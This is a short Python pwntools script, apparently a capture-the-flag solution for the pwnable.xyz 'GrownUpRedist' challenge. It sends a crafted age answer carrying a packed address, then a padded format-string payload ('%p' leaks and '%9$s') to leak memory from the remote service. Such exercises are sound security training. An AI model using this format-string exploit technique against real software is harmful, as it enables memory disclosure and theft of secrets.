#!/usr/bin/python 
from pwn import *

#p = process("./GrownUpRedist")
p = remote("svc.pwnable.xyz", 30004)

p.sendlineafter("Are you 18 years or older? [y/N]: ", 'y' + 'A'*7 + p32(0x601080))

pay = 'A'*0x20 + "%p"*8 + "%9$s" + "%p"*7
pay += 'B'*(0x80 - len(pay))

p.sendafter("Name: ", pay+'n')

p.interactive()
